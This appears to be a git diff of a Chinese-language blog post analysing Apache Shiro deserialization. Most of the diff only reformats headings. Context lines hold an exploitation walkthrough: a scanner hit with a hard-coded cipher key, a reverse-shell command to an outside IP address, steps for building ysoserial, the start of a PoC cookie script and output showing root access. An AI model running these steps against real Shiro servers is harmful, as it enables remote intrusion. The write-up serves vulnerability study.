@@ -8,8 +8,7 @@ permalink: /about/ShiroDeser/
 toc: true
 desc: 「反序列化」
 ---
-
-# 分享：Different Shiro Framework deserialization analysis ideas
+# Shiro Deser
 
 **写在文前：**
 
@@ -47,7 +46,7 @@ desc: 「反序列化」
 
 ————来自于[维基百科](https://zh.wikipedia.org/wiki/Apache_Shiro){:target="_blank"}
 
-## 0x01：简介
+### 0x01：简介
 
 **Shiro**三个核心组件：**Subject**, **SecurityManager** 和 **Realms**.
 
@@ -64,7 +63,7 @@ Subject代表了当前用户的安全操作，SecurityManager则管理所有用�
 能满足需求，你还可以插入代表自定义数据源的自己的Realm实现。~~
 
 
-## 0x02：用途
+### 0x02：用途
 
 > Apache Shiro是Java的一个安全框架。Shiro可以非常容易的开发出足够好的应用，其不仅可以用在JavaSE环境，也可以用在JavaEE环境，
 > Shiro可以帮助我们完成：认证、授权、加密、会话管理、与Web集成、缓存等。
@@ -83,7 +82,7 @@ Subject代表了当前用户的安全操作，SecurityManager则管理所有用�
 
 # 一：Shiro框架反序列化的原因
 
-## 1x01：Shiro代码层分析
+### 1x01：Shiro代码层分析
 
 - **web.xml**
 
@@ -107,7 +106,9 @@ Subject代表了当前用户的安全操作，SecurityManager则管理所有用�
 
 <kbd>⌘</kbd>+ 左键单击 `SecurityUtils` 跳转
 
-`shiro-core-1.2.4.jar!/org/apache/shiro/SecurityUtils.class`
+```
+shiro-core-1.2.4.jar!/org/apache/shiro/SecurityUtils.class
+```
 
 那么我们假设SecurityUtils类是shiro框架认证入口，那么我们只需要梳理清楚对应代码逻辑即可；
 
@@ -135,7 +136,6 @@ Subject代表了当前用户的安全操作，SecurityManager则管理所有用�
     ShiroHttpServletRequest
     ```
 
-
 web http访问后，访问调用如下：
 ```bash
 this = {index_jsp@4030} 
@@ -147,8 +147,10 @@ _jspx_out = {JspWriterImpl@5284}
 _jspx_page_context = {PageContextImpl@5285} 
 pageContext = {PageContextImpl@5285} 
 ```
+
 基本上就是这个流程；
-## 1x02：为什么这么写
+
+### 1x02：为什么这么写
 
 <h1>更新中...</h1>
 
@@ -200,7 +202,7 @@ vulnerable:true url:https://shiro.vuln.ip/login.html    CipherKey:3AvVhmFLUs0KTA
 ```
 当然秘钥对于我们理解shiro反序列化框架也有一定的帮助，shiro的反序列化最初的漏洞来源也是因为秘钥硬编码。
 
-## 2x01：getshell
+### 2x01：getshell
 通过上面的步骤我们就可以对shiro反序列化做一个判定，肯定是存在RCE漏洞，那么来实现我们的最终目的，GET-shell一般反弹shell的执行代码`bash -i >& /dev/tcp/47.52.233.92/11111 0>&1`，首先需要把代码进行base64编码，只有经过base64编码后shiro才认得这个命令，通过shiro自己本身的base64解码最终达到执行命令的目的；
 转成base64编码 :
 
@@ -224,7 +226,7 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-## 2x02：学习工具
+### 2x02：学习工具
 使用ysoserial进行流量监听，下面是ysoserial的jar包生成，懂得开发同学都懂。
 ```
 git clone https://github.com/frohoff/ysoserial.git
@@ -232,7 +234,7 @@ cd ysoserial
 mvn package -D skipTests
 ```
 
-## 2x03：how to poc
+### 2x03：how to poc
 使用poc代码获得对应的rememberMe的cookie值。
 ```
 # -*- coding:utf-8 -*-
@@ -302,7 +304,7 @@ Sending return with payload for obj [0:0:0, 2]
 Closing connection
 ```
 
-## 案例
+### 案例
 
 /usr/local/nginx/conf/nginx.conf
 
